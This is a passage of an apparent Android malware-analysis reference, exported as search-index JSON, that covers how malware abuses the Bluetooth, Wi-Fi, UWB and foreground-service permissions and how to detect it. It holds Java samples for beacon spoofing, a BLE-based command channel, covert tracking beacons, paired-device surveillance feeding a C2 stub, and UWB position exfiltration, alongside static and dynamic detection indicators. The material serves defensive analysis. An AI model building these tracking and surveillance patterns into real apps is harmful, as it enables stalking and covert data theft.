<code>BLUETOOTH_ADVERTISE</code> specifically. The permission was introduced in Android 12, splitting the monolithic <code>BLUETOOTH</code> and <code>BLUETOOTH_ADMIN</code> permissions into more granular ones. However, the underlying BLE advertising capability has been available since Android 5.0, and several theoretical and emerging abuse patterns exist.</p>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#beacon-spoofing","title":"Beacon Spoofing","text":"<p>Broadcast fake BLE beacon advertisements to trigger actions in nearby devices or apps that respond to specific beacon UUIDs. An infected device can impersonate an iBeacon, Eddystone, or AltBeacon to trigger location-based actions in nearby apps:</p> <pre><code>BluetoothLeAdvertiser advertiser = BluetoothAdapter.getDefaultAdapter()\n    .getBluetoothLeAdvertiser();\n\nAdvertiseSettings settings = new AdvertiseSettings.Builder()\n    .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)\n    .setConnectable(false)\n    .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)\n    .build();\n\nbyte[] manufacturerData = new byte[]{\n    0x02, 0x15,\n    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,\n    0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,\n    0x00, 0x01,\n    0x00, 0x02,\n    (byte) 0xC5\n};\n\nAdvertiseData data = new AdvertiseData.Builder()\n    .addManufacturerData(0x004C, manufacturerData)\n    .build();\n\nadvertiser.startAdvertising(settings, data, new AdvertiseCallback() {\n    @Override\n    public void onStartSuccess(AdvertiseSettings settingsInEffect) {\n    }\n\n    @Override\n    public void onStartFailure(int errorCode) {\n    }\n});\n</code></pre> <p>This could trigger location-based retail promotions, unlock proximity-based features in target apps, or feed false location data to beacon-based indoor positioning systems.</p>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#p2p-malware-communication","title":"P2P Malware Communication","text":"<p>Infected devices could use BLE advertisements as a local communication channel between nearby infected devices, creating a mesh-like C2 that doesn't require internet access. Data can be encoded in the advertising payload (up to 31 bytes in legacy advertisements, or 255 bytes with extended advertising on Android 8+):</p> <pre><code>byte[] c2Data = encryptAndEncode(commandPayload);\n\nAdvertiseData data = new AdvertiseData.Builder()\n    .addServiceData(\n        ParcelUuid.fromString(\"0000FFFF-0000-1000-8000-00805F9B34FB\"),\n        c2Data\n    )\n    .build();\n\nadvertiser.startAdvertising(settings, data, callback);\n</code></pre> <p>Nearby infected devices scanning with BLUETOOTH_SCAN can receive these broadcasts and decode commands. This creates an air-gapped C2 channel useful in environments with restricted internet access (corporate networks, classified facilities).</p>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#device-tracking-enablement","title":"Device Tracking Enablement","text":"<p>If the infected device broadcasts a known BLE identifier, the attacker can track its physical location using their own BLE scanners deployed in the target area. Unlike passive Bluetooth tracking (which relies on the device's random MAC rotation), an infected device broadcasting a fixed service UUID can be tracked persistently:</p> <pre><code>AdvertiseData data = new AdvertiseData.Builder()\n    .addServiceUuid(ParcelUuid.fromString(victimTrackingUuid))\n    .setIncludeDeviceName(false)\n    .build();\n\nAdvertiseSettings settings = new AdvertiseSettings.Builder()\n    .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_POWER)\n    .setTimeout(0)\n    .build();\n\nadvertiser.startAdvertising(settings, data, callback);\n</code></pre>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#airtag-style-tracker-abuse","title":"AirTag-Style Tracker Abuse","text":"<p>An infected Android device can be turned into a covert BLE tracker by continuously advertising a stable identifier. The attacker deploys BLE scanners (or uses other infected devices) in the target's environment to triangulate the victim's location. Apple's Find My network abuse and the broader tracker stalking problem demonstrate the real-world viability of BLE-based tracking.</p>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#android-version-changes","title":"Android Version Changes","text":"<p>Pre-Android 12: BLE advertising required <code>BLUETOOTH</code> and <code>BLUETOOTH_ADMIN</code> permissions (both normal/install-time). No runtime prompt was needed, making BLE advertising silently available to any installed app.</p> <p>Android 12 (API 31): <code>BLUETOOTH_ADVERTISE</code> introduced as a separate runtime permission in the <code>NEARBY_DEVICES</code> group. Apps must now request this permission at runtime before calling <code>BluetoothLeAdvertiser.startAdvertising()</code>. The <code>neverForLocation</code> flag can be set in the manifest to indicate the app does not use advertising for location purposes, which avoids requiring location permission alongside it.</p> <p>Android 13 (API 33): no significant changes to the advertising API, but the <code>NEARBY_DEVICES</code> permission group is more prominently displayed in system settings.</p> <p>Android 14 (API 34): background advertising restrictions tightened. Apps must have a foreground service or be in the foreground to maintain active BLE advertisements on some OEM implementations.</p>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.BLUETOOTH_ADVERTISE\" /&gt;\n</code></pre> <p>Expected in IoT, wearable companion, and proximity-based apps. Unusual in other app categories.</p>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#static-analysis-indicators","title":"Static Analysis Indicators","text":"<ul> <li><code>BluetoothLeAdvertiser</code> references and calls to <code>startAdvertising()</code></li> <li><code>AdvertiseData.Builder</code> construction with hardcoded service UUIDs or manufacturer data</li> <li>iBeacon-format manufacturer data with Apple's company ID (0x004C)</li> <li><code>AdvertiseSettings</code> with <code>setTimeout(0)</code> indicating indefinite advertising</li> <li>Custom data encoded in service data fields (potential C2 channel)</li> </ul>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#dynamic-analysis-indicators","title":"Dynamic Analysis Indicators","text":"<ul> <li>App starts BLE advertising without user-initiated action</li> <li>BLE advertisements containing data payloads that change over time (C2 communication)</li> <li>Advertising started immediately after boot (combined with <code>RECEIVE_BOOT_COMPLETED</code>)</li> <li>Fixed service UUIDs that persist across app restarts (tracking beacon behavior)</li> </ul>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#permission-combination-red-flags","title":"Permission Combination Red Flags","text":"<p><code>BLUETOOTH_ADVERTISE</code> combined with BLUETOOTH_SCAN enables bidirectional BLE mesh communication. When both are present with <code>INTERNET</code> and no Bluetooth peripheral UI, the app may be using BLE as a secondary C2 channel. Combined with ACCESS_FINE_LOCATION and RECEIVE_BOOT_COMPLETED, the pattern suggests persistent proximity tracking infrastructure.</p>"},{"location":"permissions/nearby-devices/bluetooth-connect/","title":"BLUETOOTH_CONNECT","text":"<p>Allows connecting to already-paired Bluetooth devices and accessing their data. Enables interacting with paired accessories, headphones, car systems, medical devices, and any other Bluetooth peripheral.</p>"},{"location":"permissions/nearby-devices/bluetooth-connect/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BLUETOOTH_CONNECT</code> Protection Level <code>dangerous</code> Permission Group <code>NEARBY_DEVICES</code> Grant Method Runtime permission dialog Introduced API 31 (Android 12)"},{"location":"permissions/nearby-devices/bluetooth-connect/#what-it-enables","title":"What It Enables","text":"<ul> <li>List paired devices via <code>BluetoothAdapter.getBondedDevices()</code></li> <li>Connect to paired devices (RFCOMM, L2CAP, GATT)</li> <li>Read device properties (name, type, battery level)</li> <li>Transfer data over Bluetooth profiles (A2DP, HFP, SPP, OBEX)</li> </ul>"},{"location":"permissions/nearby-devices/bluetooth-connect/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/nearby-devices/bluetooth-connect/#data-exfiltration-via-bluetooth","title":"Data Exfiltration via Bluetooth","text":"<p>Transfer stolen data to a nearby attacker-controlled device via Bluetooth, bypassing network monitoring entirely.</p>"},{"location":"permissions/nearby-devices/bluetooth-connect/#paired-device-enumeration","title":"Paired Device Enumeration","text":"<p>List paired devices to identify:</p> <ul> <li>Car Bluetooth (reveals vehicle make/model)</li> <li>Medical devices (health information inference)</li> <li>Smart home devices (home automation fingerprinting)</li> </ul>"},{"location":"permissions/nearby-devices/bluetooth-connect/#obex-push","title":"OBEX Push","text":"<p>Send files to paired devices via OBEX Object Push Profile. Could be used to deliver payloads to other devices in proximity.</p>"},{"location":"permissions/nearby-devices/bluetooth-connect/#notable-families","title":"Notable Families","text":"<p>No widely documented malware families specifically abuse <code>BLUETOOTH_CONNECT</code> as a primary attack vector. Bluetooth-based exfiltration and reconnaissance remain theoretical or niche capabilities in the wild. The permission is primarily of concern in stalkerware context rather than banking trojans or commodity malware.</p> <p>Commercial spyware platforms like Pegasus and FinSpy have broad device access that includes Bluetooth capabilities, but these are incidental to their primary surveillance functions rather than a documented abuse of the <code>BLUETOOTH_CONNECT</code> permission specifically.</p>"},{"location":"permissions/nearby-devices/bluetooth-connect/#stalkerware-device-proximity-tracking","title":"Stalkerware Device Proximity Tracking","text":"<p>Stalkerware families use <code>BLUETOOTH_CONNECT</code> to enumerate paired devices and monitor which Bluetooth peripherals are in range. This provides the stalker with:</p> <ul> <li>Location inference: if the victim's phone connects to their car Bluetooth, the stalker knows they are driving. Connection to a home speaker means they are at home. Office peripherals indicate they are at work.</li> <li>Social proximity: detecting unfamiliar Bluetooth device names in the pairing list can indicate the victim has been in proximity to unknown devices (other people's phones, headphones).</li> <li>Routine profiling: logging Bluetooth connection/disconnection events over time builds a pattern of the victim's daily routine.</li> </ul>"},{"location":"permissions/nearby-devices/bluetooth-connect/#abuse-code-example","title":"Abuse Code Example","text":"<pre><code>public class BluetoothRecon {\n\n    private final BluetoothAdapter adapter;\n    private final Context context;\n\n    public BluetoothRecon(Context context) {\n        this.context = context;\n        BluetoothManager manager = (BluetoothManager)\n            context.getSystemService(Context.BLUETOOTH_SERVICE);\n        this.adapter = manager.getAdapter();\n    }\n\n    public JSONArray enumeratePairedDevices() {\n        JSONArray devices = new JSONArray();\n        Set&lt;BluetoothDevice&gt; bonded = adapter.getBondedDevices();\n\n        for (BluetoothDevice device : bonded) {\n            try {\n                JSONObject info = new JSONObject();\n                info.put(\"name\", device.getName());\n                info.put(\"address\", device.getAddress());\n                info.put(\"type\", classifyDeviceType(device.getBluetoothClass()));\n                info.put(\"bond_state\", device.getBondState());\n                info.put(\"device_type\", device.getType());\n                devices.put(info);\n            } catch (Exception e) {\n            }\n        }\n        return devices;\n    }\n\n    private String classifyDeviceType(BluetoothClass btClass) {\n        if (btClass == null) return \"unknown\";\n        int major = btClass.getMajorDeviceClass();\n        switch (major) {\n            case BluetoothClass.Device.Major.AUDIO_VIDEO:\n                return \"audio_video\";\n            case BluetoothClass.Device.Major.COMPUTER:\n                return \"computer\";\n            case BluetoothClass.Device.Major.PHONE:\n                return \"phone\";\n            case BluetoothClass.Device.Major.HEALTH:\n                return \"health_device\";\n            case BluetoothClass.Device.Major.WEARABLE:\n                return \"wearable\";\n            default:\n                return \"other_\" + major;\n        }\n    }\n\n    public void monitorConnections() {\n        IntentFilter filter = new IntentFilter();\n        filter.addAction(BluetoothDevice.ACTION_ACL_CONNECTED);\n        filter.addAction(BluetoothDevice.ACTION_ACL_DISCONNECTED);\n\n        context.registerReceiver(new BroadcastReceiver() {\n            @Override\n            public void onReceive(Context ctx, Intent intent) {\n                BluetoothDevice device = intent.getParcelableExtra(\n                    BluetoothDevice.EXTRA_DEVICE);\n                String action = intent.getAction();\n                String event = BluetoothDevice.ACTION_ACL_CONNECTED.equals(action)\n                    ? \"connected\" : \"disconnected\";\n                reportToC2(device.getName(), device.getAddress(), event);\n            }\n        }, filter);\n    }\n\n    private void reportToC2(String name, String address, String event) {\n    }\n}\n</code></pre> <p>The code demonstrates two surveillance patterns: initial enumeration of all paired devices to build an inventory of the victim's Bluetooth ecosystem, and ongoing connection monitoring to track real-time proximity events.</p>"},{"location":"permissions/nearby-devices/bluetooth-connect/#android-version-changes","title":"Android Version Changes","text":"<p>Android 12 (API 31): <code>BLUETOOTH_CONNECT</code> introduced as part of the new granular Bluetooth permission model. Prior to Android 12, Bluetooth access was controlled by <code>BLUETOOTH</code> (normal permission) and <code>BLUETOOTH_ADMIN</code> (normal permission), neither of which required runtime approval. This was a significant security improvement.</p> <p>Pre-Android 12: any app with the <code>BLUETOOTH</code> normal permission could enumerate paired devices and connect to them without user awareness. Stalkerware had unrestricted Bluetooth access.</p> <p>Android 12 (API 31): apps targeting API 31+ must request <code>BLUETOOTH_CONNECT</code> at runtime to interact with paired devices. The <code>BLUETOOTH_SCAN</code> permission is required separately for discovering new devices. The <code>BLUETOOTH_ADVERTISE</code> permission is required for making the device discoverable.</p> <p>Android 13 (API 33): no changes to the permission model, but enforcement is stricter. Apps that declare <code>BLUETOOTH_CONNECT</code> without a clear Bluetooth use case face additional Play Store scrutiny.</p>"},{"location":"permissions/nearby-devices/bluetooth-connect/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.BLUETOOTH_CONNECT\" /&gt;\n</code></pre> <p>Common in legitimate apps that interact with Bluetooth accessories. Suspicious when combined with data collection permissions and no obvious Bluetooth functionality.</p>"},{"location":"permissions/nearby-devices/bluetooth-connect/#analysis-indicators","title":"Analysis Indicators","text":"<ul> <li><code>getBondedDevices()</code> calls followed by network transmission of device names, addresses, and types indicate Bluetooth reconnaissance.</li> <li><code>BroadcastReceiver</code> registrations for <code>ACTION_ACL_CONNECTED</code> and <code>ACTION_ACL_DISCONNECTED</code> without corresponding Bluetooth UI indicate connection monitoring for surveillance.</li> <li>Device classification logic (parsing <code>BluetoothClass</code> to identify device types like health, audio, wearable) suggests profiling intent beyond simple peripheral interaction.</li> <li>Combined with <code>BLUETOOTH_SCAN</code>, <code>ACCESS_FINE_LOCATION</code>, and <code>INTERNET</code>, the permission set indicates comprehensive device tracking. Legitimate Bluetooth apps typically need only <code>BLUETOOTH_CONNECT</code>.</li> <li>Periodic background enumeration of paired devices (via <code>AlarmManager</code> or <code>WorkManager</code>) without user-initiated Bluetooth interaction is a stalkerware pattern.</li> </ul>"},{"location":"permissions/nearby-devices/bluetooth-connect/#see-also","title":"See Also","text":"<ul> <li>BLUETOOTH_SCAN -- discovers new (unpaired) Bluetooth devices, providing broader environmental awareness</li> <li>BLUETOOTH_ADVERTISE -- makes the device discoverable, potentially enabling proximity-based payload delivery</li> <li>NFC Relay -- related proximity-based attack technique that also bypasses network monitoring</li> </ul>"},{"location":"permissions/nearby-devices/bluetooth-scan/","title":"BLUETOOTH_SCAN","text":"<p>Allows discovering nearby Bluetooth devices via BLE (Bluetooth Low Energy) and classic Bluetooth scanning. Scan results reveal nearby device names, MAC addresses, and BLE advertisement data, which can be used for physical tracking and location inference.</p>"},{"location":"permissions/nearby-devices/bluetooth-scan/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BLUETOOTH_SCAN</code> Protection Level <code>dangerous</code> Permission Group <code>NEARBY_DEVICES</code> Grant Method Runtime permission dialog Introduced API 31 (Android 12) <p>Before Android 12, Bluetooth scanning required <code>ACCESS_FINE_LOCATION</code>. Android 12 introduced <code>BLUETOOTH_SCAN</code> as a dedicated permission. Apps can declare <code>android:usesPermissionFlags=\"neverForLocation\"</code> to assert they won't use scan results for location inference, avoiding the location permission requirement.</p>"},{"location":"permissions/nearby-devices/bluetooth-scan/#what-it-enables","title":"What It Enables","text":"<pre><code>BluetoothLeScanner scanner = BluetoothAdapter.getDefaultAdapter().getBluetoothLeScanner();\nscanner.startScan(new ScanCallback() {\n    @Override\n    public void onScanResult(int callbackType, ScanResult result) {\n        String deviceName = result.getDevice().getName();\n        String macAddress = result.getDevice().getAddress();\n        int rssi = result.getRssi();\n        byte[] scanRecord = result.getScanRecord().getBytes();\n    }\n});\n</code></pre> <p>Scan results contain:</p> Data Use Device name Identify device type and owner MAC address Persistent device identifier (randomized on modern devices) RSSI Signal strength, proximity estimation Advertisement data Service UUIDs, manufacturer data, beacon payloads Device type Classic Bluetooth, BLE, or dual-mode"},{"location":"permissions/nearby-devices/bluetooth-scan/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/nearby-devices/bluetooth-scan/#physical-tracking","title":"Physical Tracking","text":"<p>BLE beacons (iBeacon, Eddystone) are deployed in retail, transit, and public spaces. An app scanning for beacons can determine indoor location without GPS.</p>"},{"location":"permissions/nearby-devices/bluetooth-scan/#device-fingerprinting","title":"Device Fingerprinting","text":"<p>Nearby Bluetooth devices (headphones, smartwatches, car systems) create a signature of the user's environment. This fingerprint persists even when the user changes location.</p>"},{"location":"permissions/nearby-devices/bluetooth-scan/#location-inference","title":"Location Inference","text":"<p>Bluetooth scan results can be mapped to physical locations using databases of BLE beacon positions (maintained by Google, Apple, and commercial providers).</p>"},{"location":"permissions/nearby-devices/bluetooth-scan/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.BLUETOOTH_SCAN\" /&gt;\n</code></pre> <p>Check for <code>neverForLocation</code> flag. Without it, the app can use scan results for location, which may need additional scrutiny.</p>"},{"location":"permissions/nearby-devices/nearby-wifi-devices/","title":"NEARBY_WIFI_DEVICES","text":"<p>Allows discovering nearby Wi-Fi networks and performing Wi-Fi Direct operations. Wi-Fi scan results (SSIDs and BSSIDs) can be used for location inference since Wi-Fi access point positions are mapped in global databases.</p>"},{"location":"permissions/nearby-devices/nearby-wifi-devices/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.NEARBY_WIFI_DEVICES</code> Protection Level <code>dangerous</code> Permission Group <code>NEARBY_DEVICES</code> Grant Method Runtime permission dialog Introduced API 33 (Android 13) <p>Before Android 13, Wi-Fi scanning required <code>ACCESS_FINE_LOCATION</code>. Like <code>BLUETOOTH_SCAN</code>, apps can declare <code>neverForLocation</code> to opt out of location derivation.</p>"},{"location":"permissions/nearby-devices/nearby-wifi-devices/#what-it-enables","title":"What It Enables","text":"<ul> <li>Scan for nearby Wi-Fi networks (<code>WifiManager.startScan()</code>)</li> <li>Get scan results: SSID, BSSID, signal strength, frequency, channel</li> <li>Wi-Fi Direct (P2P) device discovery and connection</li> <li>Wi-Fi Aware (NAN) ranging and messaging</li> </ul>"},{"location":"permissions/nearby-devices/nearby-wifi-devices/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/nearby-devices/nearby-wifi-devices/#location-without-gps","title":"Location Without GPS","text":"<p>Wi-Fi BSSIDs map to known geographic positions in databases maintained by Google, Apple, and commercial providers (WiGLE). Scanning nearby Wi-Fi networks reveals the device's location without GPS or location permissions (if <code>neverForLocation</code> is not declared).</p>"},{"location":"permissions/nearby-devices/nearby-wifi-devices/#network-reconnaissance","title":"Network Reconnaissance","text":"<p>Enumerate nearby Wi-Fi networks to:</p> <ul> <li>Identify enterprise networks (SSID naming patterns)</li> <li>Detect home network names</li> <li>Map network infrastructure for further attacks</li> </ul>"},{"location":"permissions/nearby-devices/nearby-wifi-devices/#wi-fi-direct-data-exfiltration","title":"Wi-Fi Direct Data Exfiltration","text":"<p>Use Wi-Fi Direct to transfer data to a nearby attacker-controlled device at high speed, bypassing internet-based monitoring.</p>"},{"location":"permissions/nearby-devices/nearby-wifi-devices/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.NEARBY_WIFI_DEVICES\" /&gt;\n</code></pre> <p>Check for <code>neverForLocation</code>. Without it, the app may derive location from Wi-Fi scan results.</p>"},{"location":"permissions/nearby-devices/uwb-ranging/","title":"UWB_RANGING","text":"<p>Allows using Ultra-Wideband (UWB) radio for precise distance measurement and spatial awareness. UWB provides centimeter-level accuracy for ranging between devices, unlike Bluetooth or Wi-Fi which offer only rough proximity estimates.</p>"},{"location":"permissions/nearby-devices/uwb-ranging/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.UWB_RANGING</code> Protection Level <code>dangerous</code> Permission Group <code>NEARBY_DEVICES</code> Grant Method Runtime permission dialog Introduced API 31 (Android 12) <p>UWB hardware is available on select devices: Pixel 6 Pro+, Samsung Galaxy S21+, and some other flagships.</p>"},{"location":"permissions/nearby-devices/uwb-ranging/#what-it-enables","title":"What It Enables","text":"<ul> <li>Measure precise distance and angle to other UWB-equipped devices</li> <li>Indoor positioning with centimeter-level accuracy</li> <li>Secure ranging for access control (digital car keys, smart locks)</li> </ul>"},{"location":"permissions/nearby-devices/uwb-ranging/#abuse-in-malware","title":"Abuse in Malware","text":"<p>No known malware families abuse <code>UWB_RANGING</code>. This is due to several factors:</p> <ul> <li>UWB hardware is only present on premium devices (Pixel 6 Pro+, Samsung Galaxy S21+, select iPhones)</li> <li>The permission requires a paired UWB accessory or a second UWB-equipped device within range</li> <li>The installed base of UWB-capable Android devices remains small</li> <li>Bluetooth and Wi-Fi based proximity detection are far more accessible alternatives</li> </ul>"},{"location":"permissions/nearby-devices/uwb-ranging/#precision-tracking-theoretical","title":"Precision Tracking (Theoretical)","text":"<p>If both the target's device and the attacker's device have UWB, the attacker can determine exact distance and direction. UWB provides centimeter-level accuracy with angle-of-arrival data, far more precise than Bluetooth RSSI-based ranging (which is accurate only to a few meters):</p> <pre><code>UwbManager uwbManager = (UwbManager) getSystemService(UWB_SERVICE);\nRangingParameters params = new RangingParameters(\n    RangingParameters.CONFIG_UNICAST_DS_TWR,\n    sessionId,\n    new UwbComplexChannel(9, 11),\n    peerDevices,\n    RangingParameters.RANGING_UPDATE_RATE_AUTOMATIC\n);\n\nCancellationSignal cancellation = new CancellationSignal();\nuwbManager.openRangingSession(params, Executors.newSingleThreadExecutor(),\n    new RangingSession.Callback() {\n        @Override\n        public void onOpened(RangingSession session) {\n            session.start(new PersistableBundle());\n        }\n\n        @Override\n        public void onRangingResult(RangingSession session, RangingResult result) {\n            if (result instanceof RangingResult.RangingResultPosition) {\n                RangingResult.RangingResultPosition position =\n                    (RangingResult.RangingResultPosition) result;\n                float distanceMeters = position.getPosition().getDistance().getValue();\n                float azimuth = position.getPosition().getAzimuth().getValue();\n                float elevation = position.getPosition().getElevation().getValue();\n                exfiltratePosition(distanceMeters, azimuth, elevation);\n            }\n        }\n    }\n);\n</code></pre>"},{"location":"permissions/nearby-devices/uwb-ranging/#access-control-relay-theoretical","title":"Access Control Relay (Theoretical)","text":"<p>UWB is used for secure ranging in digital car keys (BMW, Hyundai), smart locks, and payment terminals. A relay attack could potentially extend the UWB range, though UWB's time-of-flight design is specifically intended to resist relay attacks by detecting artificially added latency. Research from ETH Zurich and others has demonstrated theoretical relay attacks against UWB ranging by using custom hardware to minimize relay latency, but these require physical hardware, not just software exploitation.</p>"},{"location":"permissions/nearby-devices/uwb-ranging/#device-fingerprinting-theoretical","title":"Device Fingerprinting (Theoretical)","text":"<p>UWB ranging reveals the physical position of nearby UWB-equipped devices with high precision. In a corporate or government environment, this data could map the physical layout of personnel carrying UWB-capable phones, identifying meeting patterns and proximity relationships.</p>"},{"location":"permissions/nearby-devices/uwb-ranging/#android-version-changes","title":"Android Version Changes","text":"<p>Android 12 (API 31): <code>UWB_RANGING</code> introduced alongside the <code>UwbManager</code> system service. Initially supported on Pixel 6 Pro and Samsung Galaxy S21 Ultra.</p> <p>Android 13 (API 33): expanded UWB API with support for additional ranging configurations and multi-device sessions. More OEMs added UWB hardware to flagship devices.</p> <p>Android 14 (API 34): UWB API matured with improved session management, background ranging restrictions, and tighter integration with the digital car key framework. Apps must be in the foreground or have an active foreground service to maintain ranging sessions.</p> <p>Android 15: further restrictions on background UWB usage and additional support for the FiRa consortium's UWB standards for interoperability.</p>"},{"location":"permissions/nearby-devices/uwb-ranging/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.UWB_RANGING\" /&gt;\n</code></pre> <p>Only expected in apps that interact with UWB peripherals (car keys, smart home, spatial audio). Very rare in the wild.</p>"},{"location":"permissions/nearby-devices/uwb-ranging/#static-analysis-indicators","title":"Static Analysis Indicators","text":"<ul> <li>References to <code>android.uwb.UwbManager</code> or <code>UwbManager.openRangingSession()</code></li> <li><code>RangingParameters</code> configuration objects</li> <li><code>RangingSession.Callback</code> implementations that process distance and angle data</li> <li><code>UwbComplexChannel</code> usage (configures the specific UWB channel and preamble code)</li> </ul>"},{"location":"permissions/nearby-devices/uwb-ranging/#dynamic-analysis-indicators","title":"Dynamic Analysis Indicators","text":"<ul> <li>App attempts to access <code>UWB_SERVICE</code> system service</li> <li>Ranging session creation without a visible UWB-related UI</li> <li>Distance and angle data appearing in network traffic or local storage</li> <li>Repeated ranging session attempts on devices without UWB hardware (indicates probing for capability)</li> </ul>"},{"location":"permissions/nearby-devices/uwb-ranging/#permission-combination-red-flags","title":"Permission Combination Red Flags","text":"<p><code>UWB_RANGING</code> combined with BLUETOOTH_SCAN and ACCESS_FINE_LOCATION in a non-IoT app suggests multi-modal proximity tracking. Since UWB hardware is rare, the presence of <code>UWB_RANGING</code> in an app targeting a broad user base (rather than specific UWB accessories) is itself anomalous and warrants investigation.</p>"},{"location":"permissions/normal/","title":"Normal Permissions (Abusable)","text":"<p>Permissions with <code>normal</code> protection level, granted automatically at install time with no user prompt. Most are harmless, but several are critical for malware persistence, reconnaissance, and operation.</p> <p>These permissions are the foundation of malware operation. They're invisible to the user during installation and provide the infrastructure layer that everything else depends on.</p>"},{"location":"permissions/normal/#permissions","title":"Permissions","text":"Permission Abuse Potential Criticality RECEIVE_BOOT_COMPLETED Persistence: auto-start after device reboot High: survives reboot INTERNET C2 communication, data exfiltration, required by virtually all malware Essential: no malware operates without it FOREGROUND_SERVICE Long-running background operations, persistent connections, continuous monitoring High: Android 8+ requires this for background work QUERY_ALL_PACKAGES App enumeration: identify installed security tools, banking apps for targeting High: drives overlay target selection REQUEST_IGNORE_BATTERY_OPTIMIZATIONS Prevent OS from killing background processes Medium: ensures persistent operation WAKE_LOCK Keep CPU active, ensure background operations complete Medium: prevents sleep during operations"},{"location":"permissions/normal/#why-normal-permissions-matter","title":"Why Normal Permissions Matter","text":"<p>A typical banking trojan's manifest contains 4-6 of these normal permissions. Combined, they provide:</p> <ul> <li>Persistence: <code>RECEIVE_BOOT_COMPLETED</code> + <code>FOREGROUND_SERVICE</code> keeps the malware alive across reboots</li> <li>Communication: <code>INTERNET</code> enables C2 connectivity</li> <li>Targeting: <code>QUERY_ALL_PACKAGES</code> identifies which banking apps to overlay</li> <li>Reliability: <code>REQUEST_IGNORE_BATTERY_OPTIMIZATIONS</code> + <code>WAKE_LOCK</code> prevents the OS from killing the malware process</li> </ul> <p>None of these trigger a user prompt. The user has no visibility into the malware receiving these capabilities.</p>"},{"location":"permissions/normal/foreground-service/","title":"FOREGROUND_SERVICE","text":"<p>Allows running a service with a persistent notification that the system prioritizes over background processes. Used by malware to maintain long-running operations: C2 connections, screen monitoring, SMS interception, and data exfiltration that must survive Android's background execution limits.</p>"},{"location":"permissions/normal/foreground-service/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.FOREGROUND_SERVICE</code> Protection Level <code>normal\\|instant</code> Grant Method Automatically at install time Introduced API 28 (Android 9.0) <p>Before Android 9, any app could call <code>startForeground()</code> without declaring this permission. Android 9 made the permission declaration mandatory.</p>"},{"location":"permissions/normal/foreground-service/#what-it-enables","title":"What It Enables","text":"<p>A foreground service runs with higher priority than regular background processes. Android will not kill it under memory pressure (or kills it last). The trade-off is a persistent notification visible to the user.</p> <pre><code>Notification notification = new Notification.Builder(this, CHANNEL_ID)\n    .setContentTitle(\"App Running\")\n    .setSmallIcon(R.drawable.icon)\n    .build();\nstartForeground(1, notification);\n</code></pre>"},{"location":"permissions/normal/foreground-service/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/normal/foreground-service/#persistent-background-operation","title":"Persistent Background Operation","text":"<p>Combined with <code>RECEIVE_BOOT_COMPLETED</code>, this creates persistent malware that:</p> <ol> <li>Starts on boot via boot receiver</li> <li>Launches a foreground service</li> <li>Maintains C2 connection indefinitely</li> <li>Monitors foreground apps for overlay timing</li> <li>Survives most battery optimization kills</li> </ol>"},{"location":"permissions/normal/foreground-service/#notification-disguise","title":"Notification Disguise","text":"<p>Malware disguises the mandatory notification as something benign:</p> <ul> <li>\"Optimizing battery...\"</li> <li>\"Security scan in progress\"</li> <li>\"System update\"</li> <li>Minimized/transparent notification that's barely visible</li> </ul> <p>On Android 13+, users can long-press to dismiss foreground service notifications, but the service continues running.</p>"},{"location":"permissions/normal/foreground-service/#notable-families","title":"Notable Families","text":"Family Foreground Service Usage SpyNote Persistent notification disguised as system update, maintains RAT connectivity Gigabud Foreground service for continuous screen recording and data exfiltration BTMOB RAT Foreground service to maintain persistent C2 connection and screen streaming LightSpy Foreground service keeps modular surveillance plugins active"},{"location":"permissions/normal/foreground-service/#foreground-service-types","title":"Foreground Service Types","text":"<p>Android 10+ requires declaring the foreground service type:</p> Type Declaration Malware Use <code>location</code> <code>android:foregroundServiceType=\"location\"</code> Continuous GPS tracking <code>camera</code> <code>android:foregroundServiceType=\"camera\"</code> Covert recording <code>microphone</code> <code>android:foregroundServiceType=\"microphone\"</code> Audio surveillance <code>dataSync</code> <code>android:foregroundServiceType=\"dataSync\"</code> Data exfiltration <code>mediaPlayback</code> <code>android:foregroundServiceType=\"mediaPlayback\"</code> Disguise (no actual media) <code>connectedDevice</code> <code>android:foregroundServiceType=\"connectedDevice\"</code> Disguise <p>Android 14 (API 34) enforces type-specific permissions: a <code>camera</code> foreground service requires <code>CAMERA</code> permission to actually be granted.</p>"},{"location":"permissions/normal/foreground-service/#android-version-changes","title":"Android Version Changes","text":"<p>Android 8.0 (API 26): background execution limits. Apps can no longer run services freely in the background. <code>startForegroundService()</code> introduced as the replacement.</p> <p>Android 9.0 (API 28): <code>FOREGROUND_SERVICE</code> permission required in manifest.</p> <p>Android 10 (API 29): foreground service types introduced.</p> <p>Android 12 (API 31): restrictions on starting foreground services from the background. Must use exact alarms, high-priority FCM, or user interaction to start.</p> <p>Android 14 (API 34): type-specific foreground service permissions enforced. <code>dataSync</code> type limited to 6 